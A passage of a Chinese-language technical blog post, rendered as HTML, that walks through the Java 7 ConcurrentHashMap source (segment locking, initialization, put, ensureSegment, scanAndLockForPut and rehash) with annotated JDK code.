(Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</span><br><span class="line">         e != <span class="keyword">null</span>;</span><br><span class="line">         e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="java7-concurrenthashmap">Java7 ConcurrentHashMap</span></h2><p>ConcurrentHashMap 和 HashMap 思路是差不多的，但是因为它支持并发操作，所以要复杂一些。</p><p>整个 ConcurrentHashMap 由一个个 Segment 组成，Segment 代表”部分“或”一段“的意思，所以很多地方都会将其描述为<strong>分段锁</strong>。注意，行文中，我很多地方用了“<strong>槽</strong>”来代表一个 segment。</p><p>简单理解就是，ConcurrentHashMap 是一个 Segment 数组，Segment 通过继承 ReentrantLock 来进行加锁，所以每次需要加锁的操作锁住的是一个 segment，这样只要保证每个 Segment 是线程安全的，也就实现了全局的线程安全。</p><p><img src="https://www.javadoop.com/blogimages/map/3.png" alt="3"></p><p><strong>concurrencyLevel</strong>：并行级别、并发数、Segment 数，怎么翻译不重要，理解它。默认是 16，也就是说 ConcurrentHashMap 有 16 个 Segments，所以理论上，这个时候，最多可以同时支持 16 个线程并发写，只要它们的操作分别分布在不同的 Segment 上。这个值可以在初始化的时候设置为其他值，但是一旦初始化以后，它是不可以扩容的。</p><p>再具体到每个 Segment 内部，其实每个 Segment 很像之前介绍的 HashMap，不过它要保证线程安全，所以处理起来要麻烦些。</p><h3><span id="初始化">初始化</span></h3><p>initialCapacity：初始容量，这个值指的是整个 ConcurrentHashMap 的初始容量，实际操作的时候需要平均分给每个 Segment。</p><p>loadFactor：负载因子，之前我们说了，Segment 数组不可以扩容，所以这个负载因子是给每个 Segment 内部使用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">float</span> loadFactor, <span class="keyword">int</span> concurrencyLevel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(loadFactor &gt; <span class="number">0</span>) || initialCapacity &lt; <span class="number">0</span> || concurrencyLevel &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">if</span> (concurrencyLevel &gt; MAX_SEGMENTS)</span><br><span class="line">        concurrencyLevel = MAX_SEGMENTS;</span><br><span class="line">    <span class="comment">// Find power-of-two sizes best matching arguments</span></span><br><span class="line">    <span class="keyword">int</span> sshift = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ssize = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 计算并行级别 ssize，因为要保持并行级别是 2 的 n 次方</span></span><br><span class="line">    <span class="keyword">while</span> (ssize &lt; concurrencyLevel) &#123;</span><br><span class="line">        ++sshift;</span><br><span class="line">        ssize &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 我们这里先不要那么烧脑，用默认值，concurrencyLevel 为 16，sshift 为 4</span></span><br><span class="line">    <span class="comment">// 那么计算出 segmentShift 为 28，segmentMask 为 15，后面会用到这两个值</span></span><br><span class="line">    <span class="keyword">this</span>.segmentShift = <span class="number">32</span> - sshift;</span><br><span class="line">    <span class="keyword">this</span>.segmentMask = ssize - <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">        initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// initialCapacity 是设置整个 map 初始的大小，</span></span><br><span class="line">    <span class="comment">// 这里根据 initialCapacity 计算 Segment 数组中每个位置可以分到的大小</span></span><br><span class="line">    <span class="comment">// 如 initialCapacity 为 64，那么每个 Segment 或称之为"槽"可以分到 4 个</span></span><br><span class="line">    <span class="keyword">int</span> c = initialCapacity / ssize;</span><br><span class="line">    <span class="keyword">if</span> (c * ssize &lt; initialCapacity)</span><br><span class="line">        ++c;</span><br><span class="line">    <span class="comment">// 默认 MIN_SEGMENT_TABLE_CAPACITY 是 2，这个值也是有讲究的，因为这样的话，对于具体的槽上，</span></span><br><span class="line">    <span class="comment">// 插入一个元素不至于扩容，插入第二个的时候才会扩容</span></span><br><span class="line">    <span class="keyword">int</span> cap = MIN_SEGMENT_TABLE_CAPACITY; </span><br><span class="line">    <span class="keyword">while</span> (cap &lt; c)</span><br><span class="line">        cap &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 Segment 数组，</span></span><br><span class="line">    <span class="comment">// 并创建数组的第一个元素 segment[0]</span></span><br><span class="line">    Segment&lt;K,V&gt; s0 =</span><br><span class="line">        <span class="keyword">new</span> Segment&lt;K,V&gt;(loadFactor, (<span class="keyword">int</span>)(cap * loadFactor),</span><br><span class="line">                         (HashEntry&lt;K,V&gt;[])<span class="keyword">new</span> HashEntry[cap]);</span><br><span class="line">    Segment&lt;K,V&gt;[] ss = (Segment&lt;K,V&gt;[])<span class="keyword">new</span> Segment[ssize];</span><br><span class="line">    <span class="comment">// 往数组写入 segment[0]</span></span><br><span class="line">    UNSAFE.putOrderedObject(ss, SBASE, s0); <span class="comment">// ordered write of segments[0]</span></span><br><span class="line">    <span class="keyword">this</span>.segments = ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化完成，我们得到了一个 Segment 数组。</p><p>我们就当是用 new ConcurrentHashMap() 无参构造函数进行初始化的，那么初始化完成后：</p><ul><li>Segment 数组长度为 16，不可以扩容</li><li>Segment[i] 的默认大小为 2，负载因子是 0.75，得出初始阈值为 1.5，也就是以后插入第一个元素不会触发扩容，插入第二个会进行第一次扩容</li><li>这里初始化了 segment[0]，其他位置还是 null，至于为什么要初始化 segment[0]，后面的代码会介绍</li><li>当前 segmentShift 的值为 32 - 4 = 28，segmentMask 为 16 - 1 = 15，姑且把它们简单翻译为<strong>移位数</strong>和<strong>掩码</strong>，这两个值马上就会用到</li></ul><h3><span id="put-过程分析">put 过程分析</span></h3><p>我们先看 put 的主流程，对于其中的一些关键细节操作，后面会进行详细介绍。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    Segment&lt;K,V&gt; s;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="comment">// 1. 计算 key 的 hash 值</span></span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="comment">// 2. 根据 hash 值找到 Segment 数组中的位置 j</span></span><br><span class="line">    <span class="comment">//    hash 是 32 位，无符号右移 segmentShift(28) 位，剩下高 4 位，</span></span><br><span class="line">    <span class="comment">//    然后和 segmentMask(15) 做一次与操作，也就是说 j 是 hash 值的高 4 位，也就是槽的数组下标</span></span><br><span class="line">    <span class="keyword">int</span> j = (hash &gt;&gt;&gt; segmentShift) &amp; segmentMask;</span><br><span class="line">    <span class="comment">// 刚刚说了，初始化的时候初始化了 segment[0]，但是其他位置还是 null，</span></span><br><span class="line">    <span class="comment">// ensureSegment(j) 对 segment[j] 进行初始化</span></span><br><span class="line">    <span class="keyword">if</span> ((s = (Segment&lt;K,V&gt;)UNSAFE.getObject          <span class="comment">// nonvolatile; recheck</span></span><br><span class="line">         (segments, (j &lt;&lt; SSHIFT) + SBASE)) == <span class="keyword">null</span>) <span class="comment">//  in ensureSegment</span></span><br><span class="line">        s = ensureSegment(j);</span><br><span class="line">    <span class="comment">// 3. 插入新值到 槽 s 中</span></span><br><span class="line">    <span class="keyword">return</span> s.put(key, hash, value, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层皮很简单，根据 hash 值很快就能找到相应的 Segment，之后就是 Segment 内部的 put 操作了。</p><p>Segment 内部是由 <strong>数组+链表</strong> 组成的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">put</span><span class="params">(K key, <span class="keyword">int</span> hash, V value, <span class="keyword">boolean</span> onlyIfAbsent)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在往该 segment 写入前，需要先获取该 segment 的独占锁</span></span><br><span class="line">    <span class="comment">//    先看主流程，后面还会具体介绍这部分内容</span></span><br><span class="line">    HashEntry&lt;K,V&gt; node = tryLock() ? <span class="keyword">null</span> :</span><br><span class="line">        scanAndLockForPut(key, hash, value);</span><br><span class="line">    V oldValue;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 这个是 segment 内部的数组</span></span><br><span class="line">        HashEntry&lt;K,V&gt;[] tab = table;</span><br><span class="line">        <span class="comment">// 再利用 hash 值，求应该放置的数组下标</span></span><br><span class="line">        <span class="keyword">int</span> index = (tab.length - <span class="number">1</span>) &amp; hash;</span><br><span class="line">        <span class="comment">// first 是数组该位置处的链表的表头</span></span><br><span class="line">        HashEntry&lt;K,V&gt; first = entryAt(tab, index);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面这串 for 循环虽然很长，不过也很好理解，想想该位置没有任何元素和已经存在一个链表这两种情况</span></span><br><span class="line">        <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = first;;) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">                K k;</span><br><span class="line">                <span class="keyword">if</span> ((k = e.key) == key ||</span><br><span class="line">                    (e.hash == hash &amp;&amp; key.equals(k))) &#123;</span><br><span class="line">                    oldValue = e.value;</span><br><span class="line">                    <span class="keyword">if</span> (!onlyIfAbsent) &#123;</span><br><span class="line">                        <span class="comment">// 覆盖旧值</span></span><br><span class="line">                        e.value = value;</span><br><span class="line">                        ++modCount;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 继续顺着链表走</span></span><br><span class="line">                e = e.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// node 到底是不是 null，这个要看获取锁的过程，不过和这里都没有关系。</span></span><br><span class="line">                <span class="comment">// 如果不为 null，那就直接将它设置为链表表头；如果是null，初始化并设置为链表表头。</span></span><br><span class="line">                <span class="keyword">if</span> (node != <span class="keyword">null</span>)</span><br><span class="line">                    node.setNext(first);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    node = <span class="keyword">new</span> HashEntry&lt;K,V&gt;(hash, key, value, first);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">int</span> c = count + <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 如果超过了该 segment 的阈值，这个 segment 需要扩容</span></span><br><span class="line">                <span class="keyword">if</span> (c &gt; threshold &amp;&amp; tab.length &lt; MAXIMUM_CAPACITY)</span><br><span class="line">                    rehash(node); <span class="comment">// 扩容后面也会具体分析</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">// 没有达到阈值，将 node 放到数组 tab 的 index 位置，</span></span><br><span class="line">                    <span class="comment">// 其实就是将新的节点设置成原链表的表头</span></span><br><span class="line">                    setEntryAt(tab, index, node);</span><br><span class="line">                ++modCount;</span><br><span class="line">                count = c;</span><br><span class="line">                oldValue = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 解锁</span></span><br><span class="line">        unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体流程还是比较简单的，由于有独占锁的保护，所以 segment 内部的操作并不复杂。至于这里面的并发问题，我们稍后再进行介绍。</p><p>到这里 put 操作就结束了，接下来，我们说一说其中几步关键的操作。</p><h4><span id="初始化槽-ensuresegment">初始化槽: ensureSegment</span></h4><p>ConcurrentHashMap 初始化的时候会初始化第一个槽 segment[0]，对于其他槽来说，在插入第一个值的时候进行初始化。</p><p>这里需要考虑并发，因为很可能会有多个线程同时进来初始化同一个槽 segment[k]，不过只要有一个成功了就可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Segment&lt;K,V&gt; <span class="title">ensureSegment</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Segment&lt;K,V&gt;[] ss = <span class="keyword">this</span>.segments;</span><br><span class="line">    <span class="keyword">long</span> u = (k &lt;&lt; SSHIFT) + SBASE; <span class="comment">// raw offset</span></span><br><span class="line">    Segment&lt;K,V&gt; seg;</span><br><span class="line">    <span class="keyword">if</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里看到为什么之前要初始化 segment[0] 了，</span></span><br><span class="line">        <span class="comment">// 使用当前 segment[0] 处的数组长度和负载因子来初始化 segment[k]</span></span><br><span class="line">        <span class="comment">// 为什么要用“当前”，因为 segment[0] 可能早就扩容过了</span></span><br><span class="line">        Segment&lt;K,V&gt; proto = ss[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> cap = proto.table.length;</span><br><span class="line">        <span class="keyword">float</span> lf = proto.loadFactor;</span><br><span class="line">        <span class="keyword">int</span> threshold = (<span class="keyword">int</span>)(cap * lf);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 初始化 segment[k] 内部的数组</span></span><br><span class="line">        HashEntry&lt;K,V&gt;[] tab = (HashEntry&lt;K,V&gt;[])<span class="keyword">new</span> HashEntry[cap];</span><br><span class="line">        <span class="keyword">if</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))</span><br><span class="line">            == <span class="keyword">null</span>) &#123; <span class="comment">// 再次检查一遍该槽是否被其他线程初始化了。</span></span><br><span class="line">          </span><br><span class="line">            Segment&lt;K,V&gt; s = <span class="keyword">new</span> Segment&lt;K,V&gt;(lf, threshold, tab);</span><br><span class="line">            <span class="comment">// 使用 while 循环，内部用 CAS，当前线程成功设值或其他线程成功设值后，退出</span></span><br><span class="line">            <span class="keyword">while</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))</span><br><span class="line">                   == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (UNSAFE.compareAndSwapObject(ss, u, <span class="keyword">null</span>, seg = s))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> seg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，ensureSegment(int k) 比较简单，对于并发操作使用 CAS 进行控制。</p><blockquote><p>我没搞懂这里为什么要搞一个 while 循环，CAS 失败不就代表有其他线程成功了吗，为什么要再进行判断？</p><p>感谢评论区的<strong>李子木</strong>，如果当前线程 CAS 失败，这里的 while 循环是为了将 seg 赋值返回。</p></blockquote><h4><span id="获取写入锁-scanandlockforput">获取写入锁: scanAndLockForPut</span></h4><p>前面我们看到，在往某个 segment 中 put 的时候，首先会调用  node = tryLock() ? null : scanAndLockForPut(key, hash, value)，也就是说先进行一次 tryLock() 快速获取该 segment 的独占锁，如果失败，那么进入到 scanAndLockForPut 这个方法来获取锁。</p><p>下面我们来具体分析这个方法中是怎么控制加锁的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> HashEntry&lt;K,V&gt; <span class="title">scanAndLockForPut</span><span class="params">(K key, <span class="keyword">int</span> hash, V value)</span> </span>&#123;</span><br><span class="line">    HashEntry&lt;K,V&gt; first = entryForHash(<span class="keyword">this</span>, hash);</span><br><span class="line">    HashEntry&lt;K,V&gt; e = first;</span><br><span class="line">    HashEntry&lt;K,V&gt; node = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">int</span> retries = -<span class="number">1</span>; <span class="comment">// negative while locating node</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 循环获取锁</span></span><br><span class="line">    <span class="keyword">while</span> (!tryLock()) &#123;</span><br><span class="line">        HashEntry&lt;K,V&gt; f; <span class="comment">// to recheck first below</span></span><br><span class="line">        <span class="keyword">if</span> (retries &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="comment">// speculatively create node</span></span><br><span class="line">                    <span class="comment">// 进到这里说明数组该位置的链表是空的，没有任何元素</span></span><br><span class="line">                    <span class="comment">// 当然，进到这里的另一个原因是 tryLock() 失败，所以该槽存在并发，不一定是该位置</span></span><br><span class="line">                    node = <span class="keyword">new</span> HashEntry&lt;K,V&gt;(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                retries = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(e.key))</span><br><span class="line">                retries = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 顺着链表往下走</span></span><br><span class="line">                e = e.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重试次数如果超过 MAX_SCAN_RETRIES（单核1多核64），那么不抢了，进入到阻塞队列等待锁</span></span><br><span class="line">        <span class="comment">//    lock() 是阻塞方法，直到获取锁后返回</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (++retries &gt; MAX_SCAN_RETRIES) &#123;</span><br><span class="line">            lock();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((retries &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                 <span class="comment">// 这个时候是有大问题了，那就是有新的元素进到了链表，成为了新的表头</span></span><br><span class="line">                 <span class="comment">//     所以这边的策略是，相当于重新走一遍这个 scanAndLockForPut 方法</span></span><br><span class="line">                 (f = entryForHash(<span class="keyword">this</span>, hash)) != first) &#123;</span><br><span class="line">            e = first = f; <span class="comment">// re-traverse if entry changed</span></span><br><span class="line">            retries = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法有两个出口，一个是 tryLock() 成功了，循环终止，另一个就是重试次数超过了 MAX_SCAN_RETRIES，进到 lock() 方法，此方法会阻塞等待，直到成功拿到独占锁。</p><p>这个方法就是看似复杂，但是其实就是做了一件事，那就是<strong>获取该 segment 的独占锁</strong>，如果需要的话顺便实例化了一下 node。</p><h4><span id="扩容-rehash">扩容: rehash</span></h4><p>重复一下，segment 数组不能扩容，扩容是 segment 数组某个位置内部的数组 HashEntry&lt;K,V&gt;[] 进行扩容，扩容后，容量为原来的 2 倍。</p><p>首先，我们要回顾一下触发扩容的地方，put 的时候，如果判断该值的插入会导致该 segment 的元素个数超过阈值，那么先进行扩容，再插值，读者这个时候可以回去 put 方法看一眼。</p><p>该方法不需要考虑并发，因为到这里的时候，是持有该 segment 的独占锁的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法参数上的 node 是这次扩容后，需要添加到新的数组中的数据。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">rehash</span><span class="params">(HashEntry&lt;K,V&gt; node)</span> </span>&#123;</span><br><span class="line">    HashEntry&lt;K,V&gt;[] oldTable = table;</span><br><span class="line">    <span class="keyword">int</span> oldCapacity = oldTable.length;</span><br><span class="line">    <span class="comment">// 2 倍</span></span><br><span class="line">    <span class="keyword">int</span> newCapacity = oldCapacity &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    threshold = (<span class="keyword">int</span>)(newCapacity * loadFactor);</span><br><span class="line">    <span class="comment">// 创建新数组</span></span><br><span class="line">    HashEntry&lt;K,V&gt;[] newTable =</span><br><span class="line">        (HashEntry&lt;K,V&gt;[]) <span class="keyword">new</span> HashEntry[newCapacity];</span><br><span class="line">    <span class="comment">// 新的掩码，如从 16 扩容到 32，那么 sizeMask 为 31，对应二进制 ‘000...00011111’</span></span><br><span class="line">    <span class="keyword">int</span> sizeMask = newCapacity - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 遍历原数组，老套路，将原数组位置 i 处的链表拆分到 新数组位置 i 和 i+oldCap 两个位置</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; oldCapacity ; i++) &#123;</span><br><span class="line">        <span class="comment">// e 是链表的第一个元素</span></span><br><span class="line">        HashEntry&lt;K,V&gt; e = oldTable[i];</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            HashEntry&lt;K,V&gt; next = e.next;</span><br><span class="line">            <span class="comment">// 计算应该放置在新数组中的位置，</span></span><br><span class="line">            <span class="comment">// 假设原数组长度为 16，e 在 oldTable[3] 处，那么 idx 只可能是 3 或者是 3 + 16 = 19</span></span><br><span class="line">            <span class="keyword">int</span> idx = e.hash &amp; sizeMask;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="keyword">null</span>)   <span class="comment">// 该位置处只有一个元素，那比较好办</span></span><br><span class="line">                newTable[idx] = e;</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">// Reuse consecutive sequence at same slot</span></span><br><span class="line">                <span class="comment">// e 是链表表头</span></span><br><span class="line">                HashEntry&lt;K,V&gt; lastRun = e;</span><br><span class="line">                <span class="comment">// idx 是当前链表的头结点 e 的新位置</span></span><br><span class="line">                <span class="keyword">int</span> lastIdx = idx;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 下面这个 for 循环会找到一个 lastRun 节点，这个节点之后的所有元素是将要放到一起的</span></span><br><span class="line">                <span class="keyword">for</span> (HashEntry&lt;K,V&gt; last = next;</span><br><span class="line">                     last != <span class="keyword">null</span>;</span><br><span class="line">                     last = last.next) &#123;</span><br><span class="line">                    <span class="keyword">int</span> k = last.hash &amp; sizeMask;</span><br><span class="line">                    <span class="keyword">if</span> (k != lastIdx) &#123;</span><br><span class="line">                        lastIdx = k;</span><br><span class="line">                        lastRun = last;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 将 lastRun 及其之后的所有节点组成的这个链表放到 lastIdx 这个位置</span></span><br><span class="line">                newTable[lastIdx] = lastRun;</span><br><span class="line">                <span class="comment">// 下面的操作是处理 lastRun 之前的节点，</span></span><br><span class="line">                <span class="comment">//    这些节点可能分配在另一个链表中，也可能分配到上面的那个链表中</span></span><br><span class="line">                <span class="keyword">for</span> (HashEntry&lt;K,V&gt; p = e; p != lastRun; p = p.next) &#123;</span><br><span class="line">                    V v = p.value;</span><br><span class="line">                    <span class="keyword">int</span> h = p.hash;</span><br><span class="line">                    <span class="keyword">int</span> k = h &amp; sizeMask;</span><br><span class="line">                    HashEntry&lt;K,V&gt; n = newTable[k];</span><br><span class="line">                    newTable[k] = <span class="keyword">new</span> HashEntry&lt;K,V&gt;(h, p.key, v, 